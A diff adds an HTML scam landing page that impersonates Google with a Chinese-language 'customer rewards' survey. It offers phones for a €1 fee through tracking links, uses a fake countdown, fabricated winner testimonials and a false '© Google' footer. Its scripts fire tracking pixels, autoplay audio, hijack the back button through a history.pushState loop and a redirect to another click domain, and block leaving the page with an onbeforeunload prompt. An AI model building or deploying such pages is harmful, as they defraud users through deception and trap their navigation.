@@ -1,0 +1,708 @@
+<!DOCTYPE html><html lang="en"><head>
+  <base href="">
+
+    <base #href="">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/bundle_msft.css">
+    <script src="js/jquery.min.js"></script>
+    <script type="text/javascript">
+        /*=============HELPER================*/
+        var Helper = (function() {
+            var data = [];
+			var months = ['一月','二月','三月','四月','五月','六月','七月','八月','九月','十月','十一月','十二月'];
+			var days = ['星期一','星期二','星期三','星期四','星期五','星期六','星期天'];
+            function setDays(d) {      
+                if ((d.constructor !== Array) || d.length !== 7)
+                    return false;
+                days = d;
+            }
+            function setMonths(m) {
+                if ((m.constructor !== Array) || m.length !== 12)
+                    return false;
+                months = m;
+            }
+            function getDate() {
+                var now = new Date();
+                var month = typeof(months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
+                return (now.getDate()) + " " + month + " " + now.getFullYear();
+            }
+            function getMonth() {
+                var now = new Date();
+                var month = typeof(months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
+                return month;
+            }
+            function getDay() {
+                var now = new Date();
+                var day = typeof(days[now.getDay()]) == 'undefined' ? now.getDay() : days[now.getDay()];
+                return day;
+            }
+            function getDayOfMonth() {
+                var now = new Date();
+                var day = ('0' + now.getDate()).slice(-2);
+                return day;
+            }
+            function getUrlParameter(name) {
+                name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+                var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+                var results = regex.exec(location.search);
+                return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+            }
+            function findAncestor(element, name) {
+                while ((element = element.parentElement) && !element.classList.contains(name));
+                return element;
+            }
+            function bindOnQuery(query, callback, action = 'click') {
+                var elements = document.querySelectorAll(query);
+                for (var i = 0; i < elements.length; i++) {
+                    elements[i].addEventListener(action, callback, false);
+                }
+            }
+            function bindOnId(name, callback, action = 'click') {
+                var element = document.getElementById(name);
+                element.addEventListener(action, callback, false);
+            }
+            function replaceMarkers(text, markers) {
+                for (key in markers) {
+                    var search = '%' + key + '%';
+                    text = text.replace(new RegExp(search, 'g'), markers[key]);
+                }
+                return text;
+            }
+            return {
+                setDays: setDays,
+                setMonths: setMonths,
+                getDate: getDate,
+                getDay: getDay,
+                getMonth: getMonth,
+                getDayOfMonth: getDayOfMonth,
+                getUrlParameter: getUrlParameter,
+                findAncestor: findAncestor,
+                bindOnQuery: bindOnQuery,
+                bindOnId: bindOnId,
+                replaceMarkers: replaceMarkers
+            };
+        })();
+    </script>
+    <title>Google 客戶獎勵計劃</title>
+</head>
+<body class="modal-open" style="padding-right: 16px;"><div class="tingle-modal" style="display: none;"><div class="tingle-modal-box"><div class="tingle-modal-box__content"></div><div class="tingle-modal-box__footer"><button></button></div></div></div>
+<script>
+    if (typeof(window.orientation)=="undefined")
+    {
+        var o = document.createElement("img");
+        o.src='https://secure.clicktrkservices.com/click.php?event9=0';
+    }
+    else
+    {
+        var o = document.createElement("img");
+        o.src='https://secure.clicktrkservices.com/click.php?event9=1';
+    }
+</script>
+<audio autoplay="autoplay" preload="">
+<source src="https://promotion-tw.lojalaanvandaresgavor.club/v102102-cn-A/sound/WinTone.mp3" type="audio/mpeg">
+</audio>
+    <div class="tingle-modal" style="display: none;">
+        <div class="tingle-modal-box">
+            <div class="tingle-modal-box__content"></div>
+            <div class="tingle-modal-box__footer">
+                <button></button>
+            </div>
+        </div>
+    </div>
+    <div class="tingle-modal" style="display: none;">
+        <div class="tingle-modal-box">
+            <div class="tingle-modal-box__content"></div>
+            <div class="tingle-modal-box__footer">
+                <button></button>
+            </div>
+        </div>
+    </div>
+    <header>
+        <div class="logo-wrap">
+            <div class="container">
+                <div class="row">
+                    <div class="col-xs-12 col-md-8 col-md-offset-2 ">
+                        <table style="width: 100%;">
+                            <tbody>
+                                <tr>
+                                    <td class="logo">
+                                        <img id="logo" class="clickable" src="images/g-m.png">
+                                    </td>
+                                    <td class="lang">
+                                        EN
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="slogan-wrap">
+            <div class="container">
+                <div class="row">
+                    <div class="col-xs-12 col-md-8 col-md-offset-2 slogan text-xs-left">
+                        Google 客戶獎勵計劃
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <div class="container body-container">
+        <div class="row">
+            <div class="lead-container col-xs-12 col-md-8 col-md-offset-2">
+                <div id="recipe-row" class="row">
+                    <div class="col-xs-12 recipe-content">
+                        <div class="row">
+                            <div class="col-xs-1">
+                                <div class="icon-round" style="background: url(images/g-i.png) no-repeat;"></div>
+                            </div>
+                            <div class="col-xs-10 col-md-11">
+                                <div class="recipe-header">
+                                    <div class="phrase">
+                                        恭喜!
+                                    </div>
+                                    <div class="date_full">
+                                        <script>
+                                            document.write(Helper.getDate())
+                                        </script>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        					我們非常感謝妳使用我們的產品這麽長時間.<br><br>
+					我們每天選出壹小組幸運客戶,這些幸運客戶將有機會獲得來自我們合作夥伴和贊助商的高價值獎品,以此來感謝妳對我們的厚愛.
+
+					<br>
+					<br>
+					只要妳花30秒回答八個問題,妳可以贏得全新的 三星 Galaxy S9,iPhone X, 或者 iPad Air 2,這些調查可以讓我們能夠更好的理解客戶和改進產品.
+					<strong>請註意:</strong> 已經有100位客戶被選中,獎品的數量有限,請趕快行動.<br>
+					<div class="timer">
+					妳還有 <span class="marked"><span id="timer-mins">4</span> 分鐘 <span id="timer-secs">22</span> 秒</span> 來回答問題,如果沒有及時回答問題,我們將把獎品送給其他幸運客戶!
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="qu-wrap col-xs-12 col-md-8 col-md-offset-2 ">
+                <div class="row">
+                    <div class="qu-group col-xs-12">
+                        <div class="row">
+                            <div class="qu-group-header col-xs-12">
+                                您目前使用哪種設備？
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                PC/Notebook
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                Smartphone
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                Tablet
+                            </div>
+                        </div>
+						<div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                其他
+                            </div>
+                        </div>
+                    </div>
+                    <div class="qu-group col-xs-12" style="display: none;">
+                        <div class="row">
+                            <div class="qu-group-header col-xs-12">
+								您使用除Google之外的哪個搜索引擎？
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                Yahoo
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                Bing
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                其他
+                            </div>
+                        </div>
+                    </div>
+                    <div class="qu-group col-xs-12" style="display: none;">
+                        <div class="row">
+                            <div class="qu-group-header col-xs-12">
+                                你使用哪種瀏覽器？
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                Microsoft Edge
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                Chrome
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                Firefox
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                其他
+                            </div>
+                        </div>
+                    </div>
+                    <div class="qu-group col-xs-12" style="display: none;">
+                        <div class="row">
+                            <div class="qu-group-header col-xs-12">
+                                您使用哪種Google服務？
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                GMail
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                Google Maps
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                僅搜索
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                其他
+                            </div>
+                        </div>
+                    </div>
+                    <div class="qu-group col-xs-12" style="display: none;">
+                        <div class="row">
+                            <div class="qu-group-header col-xs-12">
+								您對Google產品的質量滿意嗎？
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                完全滿意
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                中度滿意
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                完全不滿意
+                            </div>
+                        </div>
+                    </div>
+                    <div class="qu-group col-xs-12" style="display: none;">
+                        <div class="row">
+                            <div class="qu-group-header col-xs-12">
+                                你的性別是什麼？
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                男
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                女
+                            </div>
+                        </div>
+                    </div>
+                    <div class="qu-group col-xs-12" style="display: none;">
+                        <div class="row">
+                            <div class="qu-group-header col-xs-12">
+                                你幾歲？
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                18歲以下
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                18-25
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                26-34
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                35-54
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="qu col-xs-12 col-md-8 col-md-offset-2">
+                                55-64
+                            </div>
+                        </div>
+                    </div>
+                    <div id="qu-progress" class="col-xs-12" style="display: none;">
+                        <div class="row">
+                            <div class="qu-group-header col-xs-12">
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div id="qu-progress-state" class="col-xs-6 col-md-4 col-md-offset-2 text-left">
+                                狀態
+                            </div>
+                            <div id="qu-progress-percent" class="col-xs-6 col-md-4 text-right">
+                                0%
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="col-xs-12 col-md-8 col-md-offset-2 qu-progress-wrap">
+                                <div id="qu-progress-bar">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div id="qu-checkpoint-10" rel="驗證您的答案" class="col-xs-10 col-md-offset-2 qu-checkpoint">
+                                <table>
+                                    <tbody>
+                                        <tr>
+                                            <td>
+                                                <div id="qu-mark-10" class="qu-mark"></div>
+                                            </td>
+                                            <td>
+                                                <span class="qu-checkpoint-desc">妳正確回答了(7/7)個問題.</span>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div id="qu-checkpoint-20" rel="檢查你的IP" class="col-xs-10 col-md-offset-2 qu-checkpoint">
+                                <table>
+                                    <tbody>
+                                        <tr>
+                                            <td>
+                                                <div id="qu-mark-20" class="qu-mark"></div>
+                                            </td>
+                                            <td>
+                                                <span class="qu-checkpoint-desc">妳的IP沒有被重復使用.</span>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div id="qu-checkpoint-30" rel="檢查是否仍有獎品可用" class="col-xs-10 col-md-offset-2 qu-checkpoint">
+                                <table>
+                                    <tbody>
+                                        <tr>
+                                            <td>
+                                                <div id="qu-mark-30" class="qu-mark"></div>
+                                            </td>
+                                            <td>
+                                                <span class="qu-checkpoint-desc">今天只剩下壹個獎品了.</span>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="qu-prize" class="col-xs-12 col-md-8 col-md-offset-2" style="display: none;">
+                        <div class="row">
+                            <div class="qu-group-header col-xs-12">
+                                選擇妳喜歡的獎品:
+                            </div>
+                        </div>
+                        <div class="row qu-prize-row">
+                            <div class="col-xs-5 text-xs-right qu-item">
+                                <img class="prize-image clickable" src="images/1497187487_s8.png">
+                            </div>
+                            <div class="col-xs-7 text-xs-left qu-prize-description">
+                                <span class="qu-prize-name clickable">Samsung Galaxy S9</span>
+                                <strong>妳的價格:</strong><span class="qu-yourprice-value"> €1 </span>(郵費)
+                                <br>
+                                <strong>庫存:</strong> 3
+                                <br>
+                                <a href="https://secure.clicktrkservices.com/index.php?lp=1" class="qu-take-it">
+									領取
+								</a>
+                            </div>
+                        </div>
+                        <div class="row qu-prize-row qu-opacied">
+                            <div class="col-xs-5 text-xs-right qu-item">
+                                <img class="prize-image" src="images/iphonex.png">
+                            </div>
+                            <div class="col-xs-7 text-xs-left qu-prize-description">
+                                <span class="qu-prize-name">iPhone X</span>
+                                <strong>妳的價格:</strong><span class="qu-yourprice-value"> €1 </span>(郵費)
+                                <br>
+                                <strong>庫存: </strong>0 
+                                <br>
+                                <div class="qu-btn-dis">
+                                    賣光了
+                                </div>
+                            </div>
+                        </div>
+                        <div class="row qu-prize-row qu-opacied">
+                            <div class="col-xs-5 text-xs-right qu-item">
+                                <img class="prize-image" src="images/1497184421_ipad.png">
+                            </div>
+                            <div class="col-xs-7 text-xs-left qu-prize-description">
+                                <span class="qu-prize-name">iPad Air 2</span>
+                                <strong>妳的價格:</strong><span class="qu-yourprice-value"> €1 </span>(郵費)
+                                <br>
+                                <strong>庫存: </strong>0 
+                                <br>
+                                <div class="qu-btn-dis">
+                                    賣光了
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row" id="comment-row">
+            <div class="col-xs-12 col-md-8 col-md-offset-2 comment-container">
+                <!-- Comments head -->
+                <div class="row">
+                    <div class="col-xs-12 text-center comment-header">
+                        評論
+                    </div>
+                </div>
+                <!-- Comments -->
+                <div class="row comment-wrap">
+                    <div class="col-xs-2 text-right">
+                        <img class="face-round" src="images/faceza1.jpg">
+                    </div>
+                    <div class="col-xs-10 col-md-8 comment-desc">
+                        <span class="name">Cui Hanying</span>
+                        <br>
+                        <strong>我不知道是不是真的,但是我確實收到了我的iPhone X!
+</strong>
+                        <br>
+                        <small class="date">44 分鐘之前</small>
+                    </div>
+                </div>
+                <div class="row comment-wrap">
+                    <div class="col-xs-2 text-right">
+                        <img class="face-round" src="images/faceza2.jpg">
+                    </div>
+                    <div class="col-xs-10 col-md-8 comment-desc">
+                        <span class="name">Shao Huo</span>
+                        <br>
+                        <strong>我很感謝我收到了獎品,三星S9手機給了我很多樂趣,大家都應該去試試這個抽獎.
+
+</strong>
+                        <br>
+                        <small class="date">50 分鐘之前</small>
+                    </div>
+                </div>
+                <div class="row comment-wrap">
+                    <div class="col-xs-2 text-right">
+                        <img class="face-round" src="images/faceza3.jpg">
+                    </div>
+                    <div class="col-xs-10 col-md-8 comment-desc">
+                        <span class="name">Zhong Jie</span>
+                        <br>
+                        <strong>今天我收到了DHL寄來的三星S9手機,謝謝!
+
+
+</strong>
+                        <br>
+                        <small class="date">2 小時之前</small>
+                    </div>
+                </div>
+                <div class="row comment-wrap">
+                    <div class="col-xs-2 text-right">
+                        <img class="face-round" src="images/faceza4.jpg">
+                    </div>
+                    <div class="col-xs-10 col-md-8 comment-desc">
+                        <span class="name">Liu Wu</span>
+                        <br>
+                        <span class="marked"><strong>@Zhong Jie</strong></span> <strong>我之前看到過這個抽獎競賽,我以為是個玩笑.我三天之前又看到了,我無聊,我就試著參加了,沒想到我真的贏得了壹個iPhone Air2!
+
+
+</strong>
+                        <br>
+                        <small class="date">3 小時之前</small>
+                    </div>
+                </div>
+                <div class="row comment-wrap">
+                    <div class="col-xs-2 text-right">
+                        <img class="face-round" src="images/faceza5.jpg">
+                    </div>
+                    <div class="col-xs-10 col-md-8 comment-desc">
+                        <span class="name">Luo Qiang</span>
+                        <br>
+                        <strong>我不敢相信我真的贏得了獎品,我之前壹直想要壹個iPhone X.
+
+</strong>
+                        <br>
+                        <small class="date">4 小時之前</small>
+                    </div>
+                </div>
+                <!-- Comment Form -->
+                <div class="row comment-wrap">
+                    <div class="col-xs-12 text-center">
+                        <textarea id="comment-area"></textarea>
+                    </div>
+                    <div class="col-xs-12 text-center">
+                        <span id="comment-post">發表你的評論</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-md-8 col-md-offset-2 copyright text-xs-center">
+                © Google 2018
+                <div class="copyright-image img-responsive">
+                    <img src="images/rta.gif">
+                </div>
+                <div class="conditions">
+                    <a href="https://secure.clicktrkservices.com/index.php?lp=1">條件</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div style="display: none;">
+        <div class="jingle-header-crutch">
+            <table>
+                <tbody>
+                    <tr>
+                        <td><img src="images/g-i.png" alt=""></td>
+                        <td class="slogan"><span class="marked">Google會員獎勵
+						</span></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <script src="js/bundle_za.js"></script>
+    <script>
+        function alertUser(msg) {
+            alert(msg);
+        }
+    </script>
+    <script type="text/javascript">
+        //backbutton
+        ! function() {
+            var t;
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+                onpopstate = function(t) {
+                    t.state && location.replace('#');
+                }
+            } catch (o) {}
+        }();
+    </script>
+    <div class="modal fade in" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" style="display: block; padding-right: 16px;">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <br>
+                    <table>
+                        <tbody>
+                            <tr>
+                                <td>
+                                    <img src="images/g-m.png" class="logo-五月n">
+                                    <p style="font-size:10.5pt"> <strong><script type="text/javascript">
+                        var d=new Date();
+			var weekday=new Array(7); 
+			weekday[0]="星期一";
+			weekday[1]="星期二";
+			weekday[2]="星期三";
+			weekday[3]="星期四";
+			weekday[4]="星期五";
+			weekday[5]="星期六";
+			weekday[6]="星期天";
+			document.write("" + weekday[d.getDay()]);
+			</script>星期二
+<script type="text/javascript">
+				var month = new Array();
+				month[0]="一月";
+				month[1]="二月";
+				month[2]="三月";
+				month[3]="四月";
+				month[4]="五月";
+				month[5]="六月";
+				month[6]="七月";
+				month[7]="八月";
+				month[8]="九月";
+				month[9]="十月";
+				month[10]="十一月";
+				month[11]="十二月";                             var mydate= new Date()
+				mydate.setDate(mydate.getDate())
+				document.write(""+month[mydate.getMonth()]+" "+mydate.getDate()+", "+mydate.getFullYear()+"");
+                        </script>一月 14, 2019
+</strong></p>
+                                    <br>
+                                    <p><b>親愛的Goole用戶,恭喜妳</b></p>
+                                    <br>
+                                    <p>恭喜妳今天有機會免費贏得壹個Samsung S9手機,iPhone X 手機,或者 iPad Air2.</p>
+                                    <br>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                <div class="modal-footer">
+                    <img src="images/google-line.png" alt="" class="modal-line">
+                    <button type="button" class="btn btn-primary" data-dismiss="modal">OK</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+    <script>
+        window.onload = function() {
+            $('#myModal').modal('show');
+        };
+    </script>
+	<script type="text/javascript">
+		var popit = true;
+		window.onbeforeunload = function() { 
+		if(popit == true) {
+		popit = false;
+		return "等待！ 還有（1）獎品可用！ 不要錯過他們！";
+		}
+		}
+	</script>
+	<script type="text/javascript" src="js/backfix.min.js"></script>
+	<script type="text/javascript">
+		bajb_backdetect.OnBack = function() {
+		window.history.back = function() {
+		document.location = 'https://secure.websponsorclicks.com/index.php?key=9je8lo12ejno655kw5rd'
+		}
+		}
+	</script>
+
+</body></html>
